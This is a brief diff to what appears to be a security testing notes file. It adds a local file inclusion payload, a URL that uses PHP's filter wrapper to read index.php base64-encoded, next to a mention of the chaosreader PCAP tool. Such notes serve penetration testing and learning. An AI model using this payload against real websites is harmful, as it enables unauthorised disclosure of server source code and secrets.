@@ -1,5 +1,10 @@
 # Notes
 
+### LFI Retrieve File without executing it
+```
+https://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+```
+
 ### Useful PCAP Reader
 ```
 chaosreader
